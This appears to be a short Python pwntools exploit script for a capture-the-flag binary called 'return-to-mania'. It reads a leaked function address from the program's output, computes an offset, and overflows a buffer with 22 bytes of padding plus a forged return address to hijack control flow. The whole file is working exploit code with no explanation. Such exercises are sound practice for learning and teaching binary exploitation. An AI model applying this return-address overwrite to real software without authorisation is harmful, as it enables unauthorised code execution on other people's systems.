from pwn import *

e = ELF('./return-to-mania')
p = process('./return-to-mania')

res = p.recvuntil('ed')
print res
welcome_addr = int(res.split(' ')[11],16)
print welcome_addr

payload = 'A'*22
payload += p32(welcome_addr-144)
p.sendline(payload)
#p.interactive()
print p.recvall()